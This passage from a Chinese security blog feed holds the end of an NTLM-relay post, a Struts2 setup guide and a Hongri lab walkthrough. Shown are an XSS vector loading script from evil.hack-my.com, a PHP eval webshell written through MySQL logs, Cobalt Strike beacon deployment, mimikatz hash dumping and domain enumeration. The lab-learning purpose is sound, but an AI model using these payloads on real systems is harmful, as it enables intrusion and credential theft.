DNS 的权限，因此可以通过该脚本为运行 Responder 的服务器注册一个子域名，如evil.hack-my.com</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Import-Module .、InvokeDNSUpdate.ps1<br>Invoke-DNSUpdate -DNSType A -DNSName evil.hack-my.com -DNSData 10.10.10.147<br></code></pre></td></tr></table></figure><p>然后xss攻击向量修改成这样即可截获NTLM认证</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">&lt;scripts src=<span class="hljs-string">&quot;//evil.hack-my.com/xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3><span id="file-inclusion">File Inclusion</span></h3><p>在 Windows 下，PHP 的常见文件包含文件读取类函数，可以解析 UNC 网络路径</p><p>如果网站存在 XXE、SSRF 等漏洞，都可以通过指定网络路径(UNC 或 HTTP)，尝试触发 NTLM 请求。</p><h3><span id="sql注入">SQL注入</span></h3><p>在 Windows 下安装的 MySQL 数据库中，load_file、into dumpfile等常见操作均支持UNC 路径</p><p><img src="http://cdn.clown2024.cn/202407151446373.png" alt="image-20240528234420733"></p><p>mysql的前提是要拥有相关操作的权限，并且没有secure_file_priv的限制</p><p>对应SQL Server数据库，通过调用xp_dirtree等存储过程可以发起NTLM请求：</p><p><img src="http://cdn.clown2024.cn/202407151446374.png" alt="image-20240528234602866"></p><h2><span id="llmnrx2fnbns欺骗利用">LLMNR&#x2F;NBNS欺骗利用</span></h2><p>LLMNR(Link-Local Multicast Name Resolution,链路本地多播名称解析)是一个基于协议的域名系统(DNS)数据包的格式，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。</p><p>NBNS 的全称为 NetBIOS Name Service，用于在基于 NetBIOS 名称访问的网络上提供主机名和地址映射方法。几乎所有局域网都是在NetBIOS协议的基础上工作的，操作系统可以利用 WINS 服务、广播和 Lmhost 文件等，以将NetBIOS名称解析到相应的IP 地址。</p><p>当一台主机要访问另一台主机时，会先在自己本地名称缓存中查询目标主机的名称。如果在本地缓存中没有找到对应的名称，那么主机会向 DNS 服务器发送查询请求。如果主机没有收到响应或收到了错误的信息，那么主机会使用 LLMNR 或 NBNS 分别向局域网内发送 UDP 多播或广播请求，以查询对应的主机名。局域网的其他主机在收到这个查询请求后，会将被查询的名称与自己的主机名进行比较。如果与自己的主机名一致，就回复一条包含了自己 IP 地址的单播响应给发出该査询请求的主机，否则丢弃之。</p><p>那么测试人员就可以在该过程中使用中间人攻击，当合法主机输入不存在或者错误的主机名，测试人员就可以代替这个主机进行回复，并通过Responder等工具要求受害机器发起NTLM身份验证。</p><h1><span id="中继到smb利用">中继到SMB利用</span></h1>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2漏洞学习</title>
      <link href="/2024/05/10/Struts2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/05/10/Struts2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1><span id="struts2介绍">Struts2介绍</span></h1><p>Struts2是以MVC架构为基础的WEB框架，通过WEB Filter的方式内嵌在WEB服务器中进行使用，他对servlet进行了封装。</p><p>Struts2与Struts1关系：Struts2是Struts的下一代产品，是在Struts1和WebWork的技术基础上进行了合并的全新的Struts2框架<br>其全新的Struts2的体系结构与Struts1的体系结构差别巨大。</p><p>Struts2以WebWork为核心</p><p>Struts2&#x3D;Struts1+WebWork</p><p>Struts2是Apache的产品。</p><p>Struts2是一个标准的MVC框架。JAVAWEB中的model2模式就是一个MVC模式。model2&#x3D;Servlet+jsp+JavaBean</p><p>Struts2框架是在JAVAWEB开发中使用的。<br>使用Struts2框架，可以简化我们的web开发，并且降低程序的耦合度。</p><p>类似于Struts2框架的产品：Struts1、webwork、jsf（Sun提供）、SpringMVC都是MVC模式</p><h1><span id="struts2环境配置">Struts2环境配置</span></h1><p>这里采用maven添加依赖的方式配置</p><p>这里选了一个最低版本的方便漏洞测试</p><p><img src="http://cdn.clown2024.cn/202407151444306.png" alt="image-20240510165534126"></p><p>可以安装一个struts2插件方便高亮显示</p><p><img src="http://cdn.clown2024.cn/202407151444307.png" alt="image-20240510165817113"></p><p>配置web.xml的过滤器和映射,配置可以参考官网：<a href="https://struts.apache.org/getting-started/how-to-create-a-struts2-web-application#our-first-application%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%BF%87%E6%BB%A4%E5%99%A8%E5%8F%AF%E8%83%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84%E6%A1%86%E6%9E%B6%E4%B8%8D%E4%B8%80%E6%A0%B7%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E9%80%89%E6%8B%A9%EF%BC%8C%E8%BF%98%E5%8F%AF%E4%BB%A5%E4%BB%8E%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E7%BB%99%E7%9A%84%E7%A4%BA%E4%BE%8Bwar%E5%8C%85%E4%B8%AD%E7%9A%84WEB-INF%E4%B8%8B%E7%9A%84web.xml%E6%9D%A5%E5%8F%82%E8%80%83">https://struts.apache.org/getting-started/how-to-create-a-struts2-web-application#our-first-application，不过过滤器可能不同版本的框架不一样需要自己选择，还可以从项目源码给的示例war包中的WEB-INF下的web.xml来参考</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Basic Struts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444308.png" alt="image-20240510190214572"></p><p>解释一下各标签的含义，配得比较少顺便记录一下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;display-name&gt;：这是一个可选的标签，用于为 Web 应用提供一个显示名称。这个名称通常在部署时或通过应用服务器的管理界面展示。<br>&lt;filter&gt;：定义一个过滤器，它是 Java Servlet 规范的一部分，用于拦截进入 Servlet 容器的请求和响应。<br><br>&lt;filter-name&gt;：为过滤器指定一个名称，这里名称为 struts2。这个名称在整个应用中应该是唯一的，并且在后面定义 &lt;filter-mapping&gt; 时会被引用。<br>&lt;filter-class&gt;：指定过滤器的完整类名。在这个例子中，org.apache.struts2.dispatcher.FilterDispatcher 是 Struts2 框架的核心过滤器类，它负责拦截请求并分派给相应的 Action 对象处理。<br><br>&lt;filter-mapping&gt;：定义如何将过滤器映射到 Servlet 容器中的 URL 请求上。<br><br>&lt;filter-name&gt;：指定上面定义的过滤器的名称，这里引用了 struts2 过滤器。<br>&lt;url-pattern&gt;：定义过滤器将被应用于哪些 URL 请求。/* 是一个通配符，表示所有的 URL 请求都将被 struts2 过滤器处理。<br><br>&lt;welcome-file-list&gt;：定义应用的欢迎文件，当用户访问应用的根目录而没有指定具体页面时，Servlet 容器将提供这些文件。<br><br>&lt;welcome-file&gt;：指定欢迎文件的名称，这里为 index.jsp。这意味着当用户访问应用的根 URL 时，如 http://localhost:8080/YourApp/，Servlet 容器将自动提供 index.jsp 页面。<br></code></pre></td></tr></table></figure><p>然后就是自己添加一个struts2.xml用来指定 URL、Java 类和视图页面（例如<code>index.jsp</code>）之间的关系，这里也参考上面官网的配置，文件路径为<code>src/main/resources</code>，dtd文件的版本也要和自己的框架版本对应</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">struts</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.devMode&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span><br>    <span class="hljs-comment">&lt;!--所有的action要放在packages中，且要继承struts-default包，因为里面是该框架封装的东西--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicstruts2&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--name对应的是请求地址，class是请求处理的类--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--result的name是Action类中返回的字符串，对应不同相应到不同页面--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;action.HelloWorldAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;execute&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/HelloWorld.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444309.png" alt="image-20240510191813662"></p><p><code>struts.xml</code> 文件的主要作用包括：</p><ol><li><strong>定义包（Packages）</strong>：Struts 2 允许通过包的概念来组织和隔离不同的 Action 和结果类型。每个包可以有自己的命名空间，并且可以重用其他包中定义的类。</li><li><strong>配置 Action</strong>：在 <code>struts.xml</code> 中，你可以定义 Action，包括 Action 的类、方法以及它们映射到的请求 URL。Action 映射可以是简单的路径映射，也可以是更复杂的参数映射。</li><li><strong>结果（Result）映射</strong>：为每个 Action 定义可能的结果映射。结果可以是转发到另一个页面、重定向到另一个 URL，或者是自由格式的字符串。</li><li><strong>拦截器（Interceptors）配置</strong>：Struts 2 使用拦截器来处理如身份验证、日志记录、事务管理等横切关注点。在 <code>struts.xml</code> 中，可以定义拦截器栈（Interceptor Stacks）和特定的拦截器。</li><li><strong>异常处理</strong>：定义全局和操作级别的异常处理机制，允许你捕获和处理应用程序中的异常。</li><li><strong>类型转换</strong>：配置如何将 HTTP 请求参数转换为 Action 属性的类型。</li><li><strong>包含其他配置文件</strong>：可以使用 <code>&lt;include&gt;</code> 标签来包含其他配置文件，这有助于将配置分散到多个文件中，使主配置文件保持简洁。</li><li><strong>常量和文本资源</strong>：定义可以在多个地方使用的常量，以及国际化的文本资源。</li><li><strong>动态方法调用</strong>：允许你定义特定 Action 对应的多个方法，这些方法可以通过请求参数来动态调用。</li></ol><p><strong>写一个简单程序</strong></p><p>现在按照上面的struts.xml的配置来写一个hellworld的程序：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldAction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Action</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello Struts2~~&quot;</span>);<br>        <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>目录结构如下：</p><p><img src="http://cdn.clown2024.cn/202407151444310.png" alt="image-20240510202619138"></p><blockquote><p>额这里配置时又有个坑，他的web目录下的有关struts2依赖的jar全都没有自动导入到WEB-INF&#x2F;lib下面，会导致启动的出现过滤器异常的问题</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444311.png" alt="image-20240510202443723"></p><p>所以要在这里把右边的jar包都添加过去才行。</p><p>然后启动tomcat服务器即可、</p><blockquote><p>难绷只能说又被坑惨了一次，访问路由是需要.action后缀的，不然就是资源未访问，难绷</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444312.png" alt="image-20240510205435309"></p><p><img src="http://cdn.clown2024.cn/202407151444313.png" alt="image-20240510205450490"></p><p>要修改后缀可以在struts.xml中使用这个属性设置</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.action.extension&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>这样子可以去掉后缀，但后果是所有jsp文件都不解析了，只能使用不带后缀的路由，然后根目录访问就是404访问半天也找不到原因服了，就这样吧</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444314.png" alt="image-20240510214235237"></p><p><img src="http://cdn.clown2024.cn/202407151444315.png" alt="image-20240510214249703"></p><blockquote><p>不过这样看到后缀是action的路由就能很明显的判断出是status框架</p></blockquote><h1><span id="s2-001远程代码执行漏洞">S2-001远程代码执行漏洞</span></h1><p>参考文章：<a href="https://anquanke.com/post/id/254808">https://anquanke.com/post/id/254808</a></p><p>S2-001的漏洞原理是模板文件（JSP）中引用了不合适的标签进行渲染，并且渲染的值是用户可控的，此时则达成了表达式注入的目的。</p><p>这篇文章从源码上去分析，十分详细，我这里就总结一下重点的地方</p><h2><span id="ognl表达式">OGNL表达式</span></h2><p>要先简单了解一下OGNL表达式是什么，因为该漏洞就是和该表达式渲染相关而产生的漏洞</p>]]></content>
      
      
      <categories>
          
          <category> Java框架漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场-1</title>
      <link href="/2024/05/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/"/>
      <url>/2024/05/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</url>
      
        <content type="html"><![CDATA[<h1><span id="靶场说明">靶场说明</span></h1><p>虚拟机的统一密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hongrisec@2019<br>//有些靶机密码过期需要更改，统一改成下面这个<br>Hongrisec@2019<br></code></pre></td></tr></table></figure><p><strong>官方的靶场描述</strong></p><p>一、环境搭建<br>1.环境搭建测试<br>2.信息收集</p><p>二、漏洞利用<br>3.漏洞搜索与利用<br>4.后台Getshell上传技巧<br>5.系统信息收集<br>6.主机密码收集</p><p>三、内网搜集<br>7.内网–继续信息收集<br>8.内网攻击姿势–信息泄露<br>9.内网攻击姿势-MS08-067<br>10.内网攻击姿势-SMB远程桌面口令猜测<br>11.内网攻击姿势-Oracle数据库TNS服务漏洞<br>12.内网攻击姿势-RPC DCOM服务漏洞</p><p>四、横向移动<br>13.内网其它主机端口-文件读取<br>14.内网其它主机端口-redis<br>15.内网其它主机端口-redis Getshell<br>16.内网其它主机端口-MySQL数据库<br>17.内网其它主机端口-MySQL提权</p><p>五、构建通道<br>18.内网其它主机端口-代理转发</p><p>六、持久控制<br>19.域渗透-域成员信息收集<br>20.域渗透-基础服务弱口令探测及深度利用之powershell<br>21.域渗透-横向移动[wmi利用]<br>22.域渗透-C2命令执行<br>23.域渗透-利用DomainFronting实现对beacon的深度隐藏<br>24.域渗透-域控实现与利用</p><p>七、痕迹清理<br>25、日志清理</p><p><strong>靶场拓扑结构</strong></p><p><img src="http://cdn.clown2024.cn/202407151737522.png" alt="image-20240502190140254"></p><p><img src="http://cdn.clown2024.cn/202407151737523.png" alt="image-20240502222209415"></p><blockquote><p>win7为网站服务器，winServer为域成员，win2k3为域控</p></blockquote><h2><span id="环境配置">环境配置</span></h2><p>这里win7相当于网站服务器，需要两个网卡，我这里设置为VMnet2(仅主机模式)和VMnet8(NAT模式，和外界连通)</p><p><img src="http://cdn.clown2024.cn/202407151737525.png" alt="image-20240502223937110"></p><p><strong>win7</strong></p><p><img src="http://cdn.clown2024.cn/202407151737526.png" alt="image-20240502224014134"></p><p><strong>win_server</strong></p><p><img src="http://cdn.clown2024.cn/202407151737527.png" alt="image-20240502224057123"></p><p><strong>win2k3</strong></p><p><img src="http://cdn.clown2024.cn/202407151737528.png" alt="image-20240502224144546"></p><p>设置完之后需要去网络共享将ipv4改成自动获取地址，然后Windows7防火墙要关闭不然外界ping不通；</p><p>最后去相互ping一下看能否连通即可</p><p>最后启动win7上的web服务即可</p><p><img src="http://cdn.clown2024.cn/202407151737529.png" alt="image-20240502234452111"></p><p>然后去访问一下是能看到php探针的</p><p><img src="http://cdn.clown2024.cn/202407151737530.png" alt="image-20240502234617353"></p><blockquote><p>难绷后面发现win7使用<strong>net user &#x2F;domain</strong>连不上域网络，配了好久才好但也不清楚具体什么原因；配置的时候就严格按照官方的网段来配置重新配了一遍，将VMnet2网卡配置成192.168.52.xx网段，因为虚拟机一开始就已经配置了固定的ip。</p></blockquote><h1><span id="web页面渗透">Web页面渗透</span></h1><h2><span id="php探针">php探针</span></h2><p>就直接先从php的探针首页开始入手，从这里开始渗透这个Web网站</p><p><img src="http://cdn.clown2024.cn/202407151737531.png" alt="image-20240502235433732"></p><p>看到有个mysql连接先检测一下看看，直接root、root尝试一下</p><p><img src="http://cdn.clown2024.cn/202407151737532.png" alt="image-20240502235519904"></p><p>运气很好直接成功了，但是现在暂时没什么用</p><h2><span id="其他页面">其他页面</span></h2><p>那就惯例来目录扫描看一看，这里用gobuster</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gobuster dir -u &quot;http://192.168.20.134/&quot; --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737533.png" alt="image-20240502235937240"></p><p>但是基本都是403，但是有一个phpmyadmin后台页面开着</p><p>然后用我们刚刚测试出来的数据库用户名和密码直接就可以登进去了(root:root)</p><p><img src="http://cdn.clown2024.cn/202407151737534.png" alt="image-20240503000212471"></p><h2><span id="phpmyadmin后台getshell">phpmyadmin后台getshell</span></h2><p>参考文章：<a href="https://www.cnblogs.com/0nc3/p/12071314.html">https://www.cnblogs.com/0nc3/p/12071314.html</a></p><p>总结一下大致有这几种getshell方式：</p><ol><li><p>select into outfile直接写入shell</p><p>条件：</p><ul><li>对web目录需要有写权限能够使用单引号</li><li>知道绝对路径</li><li>secure_file_priv没有具体值</li></ul></li><li><p>全局日志getshell</p><p>条件：root权限</p></li><li><p>慢查询日志getshell</p></li></ol><p>一开始尝试直接into outfile写入木马失败，绝对路径可以从上面的php探针页面知道网站的绝对路径为：<code> C:/phpStudy/WWW</code>，也可以通过@@basedir来查询，只不过查到的是mysql的根目录，但是可以反推一下</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737535.png" alt="image-20240503002537962"></p><p>去看一下参数</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737536.png" alt="image-20240503002657736"></p><p>这里为NULL代表限制mysql不允许导入导出，那就只能看一下其他方法了</p><p><strong>全局日志写shell</strong></p><p>这里看看全局日志的配置情况</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%general%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737537.png" alt="image-20240503002947148"></p><p>然后我们可以开启general_log，并修改文件位置为我们的网站的shell.php</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log <span class="hljs-operator">=</span> <span class="hljs-keyword">on</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737538.png" alt="image-20240503003300408"></p><p>接下来我们直接查询一下木马就会写入日志了</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot;<br></code></pre></td></tr></table></figure><p>最后蚁剑连接成功getshell</p><p><img src="http://cdn.clown2024.cn/202407151737539.png" alt="image-20240503003518399"></p><h2><span id="yxcms">yxcms</span></h2><p>我们getshell之后可以看到还有一个yxcms，这是当时没扫出来的</p><p><img src="http://cdn.clown2024.cn/202407151737540.png" alt="image-20240503003928666"></p><p>这个地方看网上也是一个后台，在首页的公告栏处就会有账号密码，登陆之后就可以直接添加一个shell.php的文件了，这里就不测了。</p><h1><span id="cs打法">CS打法</span></h1><p>这里刚好熟悉一下cs的使用，用cs来上线靶机，cs的简单部署也直接记录在这里好了</p><h2><span id="cs部署">cs部署</span></h2><p>先安装java环境，网上随便找个教程即可，这里安装java8参考：<a href="https://cloud.tencent.com/developer/article/2105638">https://cloud.tencent.com/developer/article/2105638</a></p><p>这里记录一下安装命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">先官网下载一个jdk包，创建一个目录存放解压后文件，我这里的jdk是<span class="hljs-string">&quot;jdk-8u401-linux-x64.tar.gz&quot;</span></span><br>sudo mkdir /usr/lib/jvm<br>sudo tar -zxvf jdk-8u401-linux-x64.tar.gz -C /usr/lib/jvm<br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改环境变量</span><br>sudo vim ~/.bashrc<br><span class="hljs-meta prompt_">#</span><span class="language-bash">文件末尾添加</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span> oracle jdk environment</span><br>export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_401  ## 这里要注意目录要换成自己解压的jdk 目录<br>export JRE_HOME=$&#123;JAVA_HOME&#125;/jre  <br>export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib  <br>export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH <br><span class="hljs-meta prompt_">#</span><span class="language-bash">使环境变量生效</span><br>source ~/.bashrc<br><span class="hljs-meta prompt_">#</span><span class="language-bash">设置默认jdk</span><br>sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_401/bin/java 300  <br>sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.8.0_401/bin/javac 300  <br>sudo update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk1.8.0_401/bin/jar 300   <br>sudo update-alternatives --install /usr/bin/javah javah /usr/lib/jvm/jdk1.8.0_401/bin/javah 300   <br>sudo update-alternatives --install /usr/bin/javap javap /usr/lib/jvm/jdk1.8.0_401/bin/javap 300 <br><span class="hljs-meta prompt_">#</span><span class="language-bash">执行</span><br>sudo update-alternatives --config java<br><span class="hljs-meta prompt_">#</span><span class="language-bash">测试安装成功</span><br>java -version<br>javac -version<br></code></pre></td></tr></table></figure><p>用一台外网主机来部署cs服务器，要给server目录下的teamserver文件可执行权限</p><p><img src="http://cdn.clown2024.cn/202407151737541.png" alt="image-20240503112207679"></p><p>然后启动团队服务器，设置当前服务器的ip地址和密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./teamserver &lt;vps地址&gt; &lt;密码&gt;<br></code></pre></td></tr></table></figure><p>然后利用启动脚本启动，我用的4.8版本只有一个启动脚本，其他版本是分不同系统不同的启动脚本，我这里启动脚本在Windows启动不了，环境没搞定，所以我就用kali了</p><p><img src="http://cdn.clown2024.cn/202407151737542.png" alt="image-20240503162849976"></p><p>然后输入主机和密码登陆即可，用户名随便定</p><p><img src="http://cdn.clown2024.cn/202407151737543.png" alt="image-20240503163035180"></p><blockquote><p>我这里服务器搭在了腾讯云上面，记得要开放50050的防火墙端口才能连上</p><p>具体功能使用可以看这篇文章：<a href="https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html">https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html</a></p><p>云服务器搭建可能出现的问题参考这篇文章：<a href="https://www.cnblogs.com/henry666/p/14027939.html">云服务器上搭建cobalt strike遇到的一些小问题 - 亨利其实很坏 - 博客园 (cnblogs.com)</a></p></blockquote><h2><span id="cs上线靶机">cs上线靶机</span></h2><p>生成一个Windows后门通过蚁剑上传到靶机</p><p><img src="http://cdn.clown2024.cn/202407151737544.png" alt="image-20240503164400241"></p><p>在这之前要先配置一个监听器</p><p><img src="http://cdn.clown2024.cn/202407151737545.png" alt="image-20240503165738645"></p><p>利用蚁剑上传到网站后，运行该程序即可看到靶机上线</p><p><img src="http://cdn.clown2024.cn/202407151737546.png" alt="image-20240503165821623"></p><p>可以直接右击靶机利用mimikatz抓取本地密码，或者直接输入hashdump列出用户哈希</p><p><img src="http://cdn.clown2024.cn/202407151737547.png" alt="image-20240503170150900"></p><p>然后利用Explore&#x3D;》new view探测一下其他主机</p><p><img src="http://cdn.clown2024.cn/202407151737548.png" alt="image-20240503170603756"></p><p><img src="http://cdn.clown2024.cn/202407151737549.png" alt="image-20240503170916667"></p><p>扫出了我们内网的另外两台靶机</p><p><strong>域内信息搜集</strong></p><p>麻了，这里win7连不上域控是真的无语，也不知道网卡出了什么问题搞了半天。</p><blockquote><p>后来严格按照官网重新配了一遍才好，上面也有说明；</p></blockquote><p>可以使用sleep 0加快一下交互，不过实战可能最好不要，因为容易被发现</p><p><img src="http://cdn.clown2024.cn/202407151737550.png" alt="image-20240508231828984"></p><p>我们可以先确定一下域控和其他域用户</p><p><strong>判断域环境</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net config workstation<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737551.png" alt="image-20240508232032749"></p><p><strong>判断域用户</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net user /domain<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737552.png" alt="image-20240508232158760"></p><p><strong>判断域控</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net group &quot;Domain Controllers&quot; /domain<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737553.png" alt="image-20240508232406793"></p><p>确定了域控的主机为<code>OWA$</code>，可以ping一下看能不能通</p><p><img src="http://cdn.clown2024.cn/202407151737554.png" alt="image-20240508232935606"></p><p>利用<code>net time</code>也可以定位域控，这里就不演示了</p><p><strong>看一下域管理员</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net group &quot;Domain Admins&quot; 